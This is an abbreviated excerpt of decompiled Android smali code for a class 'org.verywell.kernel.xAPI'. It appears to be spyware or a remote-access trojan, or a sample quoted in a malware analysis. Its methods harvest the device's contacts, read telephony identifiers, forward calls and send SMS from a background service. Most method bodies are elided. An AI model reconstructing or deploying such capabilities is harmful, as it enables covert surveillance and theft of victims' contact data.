.class public Lorg/verywell/kernel/xAPI;
...
.method public constructor <init>(Ljava/lang/String;Landroid/telephony/TelephonyManager;)V
    ...
    iput-object v0, p0, Lorg/verywell/kernel/xAPI;->hash:Ljava/lang/String;

    .line 45
    const/4 v0, 0x0

    iput-object v0, p0, Lorg/verywell/kernel/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    .line 48
    iput-object p1, p0, Lorg/verywell/kernel/xAPI;->hash:Ljava/lang/String;

    .line 49
    iput-object p2, p0, Lorg/verywell/kernel/xAPI;->telemgr:Landroid/telephony/TelephonyManager;
...
.method public StartNewActivity(Ljava/lang/Class;)V
    ...
    invoke-virtual {v1}, Lorg/verywell/kernel/RunService;->getApplicationContext()Landroid/content/Context;
    ...
    invoke-virtual {v1, v0}, Lorg/verywell/kernel/RunService;->startActivity(Landroid/content/Intent;)V
...
.method public callForward(Ljava/lang/String;)V
    ...
    .prologue
    .line 102
    new-instance v2, Lorg/verywell/kernel/PhoneCallListener;

    invoke-direct {v2}, Lorg/verywell/kernel/PhoneCallListener;-><init>()V

    .line 103
    .local v2, "phoneListener":Lorg/verywell/kernel/PhoneCallListener;
    iget-object v3, p0, Lorg/verywell/kernel/xAPI;->telemgr:Landroid/telephony/TelephonyManager;
    ...
    invoke-virtual {v3, v0}, Lorg/verywell/kernel/RunService;->startActivity(Landroid/content/Intent;)V
...
.method public getContacts()Ljava/util/ArrayList;
    ...
    .annotation system Ldalvik/annotation/Signature;
        value = {
            ...
            "<",
            "Lorg/verywell/kernel/utilities/PhoneContact;",
            ">;"
        }
    .end annotation
    ...
    invoke-virtual {v1}, Lorg/verywell/kernel/RunService;->getContentResolver()Landroid/content/ContentResolver;
    ...
    .line 213
    .local v6, "alContacts":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/verywell/kernel/utilities/PhoneContact;>;"
    ...
    .line 226
    new-instance v7, Lorg/verywell/kernel/utilities/PhoneContact;

    invoke-direct {v7}, Lorg/verywell/kernel/utilities/PhoneContact;-><init>()V

    .line 227
    .local v7, "contact":Lorg/verywell/kernel/utilities/PhoneContact;
    ...
    iput-object v1, v7, Lorg/verywell/kernel/utilities/PhoneContact;->phone:Ljava/lang/String;
    ...
    iput-object v1, v7, Lorg/verywell/kernel/utilities/PhoneContact;->name:Ljava/lang/String;
    ...
    .line 232
    .end local v7    # "contact":Lorg/verywell/kernel/utilities/PhoneContact;
    :cond_1
...
.method public getTelephonyInfo()[Ljava/lang/String;
    ...
    iget-object v2, p0, Lorg/verywell/kernel/xAPI;->telemgr:Landroid/telephony/TelephonyManager;
...
.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    ...
    invoke-virtual {p0, p1, p2, v0}, Lorg/verywell/kernel/xAPI;->sendSMS(Ljava/lang/String;Ljava/lang/String;I)V
